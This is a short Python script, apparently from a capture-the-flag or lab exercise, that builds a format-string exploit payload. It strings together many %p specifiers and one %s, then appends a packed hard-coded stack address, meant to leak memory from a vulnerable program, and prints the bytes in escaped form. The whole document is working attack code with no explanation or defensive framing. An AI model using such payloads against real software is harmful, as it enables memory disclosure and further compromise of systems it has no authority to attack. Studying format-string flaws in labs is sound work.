#!/usr/bin/env python3

import struct

# pack a 64 bit to little endian
def p(x): return struct.pack('<Q', x)
def printable(x): return (x >= 0x20 and x <= 0x7e)

payload = b'%p %p %p %p %p %p %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p    '
payload += p(0x7fffffffe4b0)

for p in payload:
    if printable(p):
        print(chr(p), end='')
    else:
        print("\\x%02x" % p, end="")
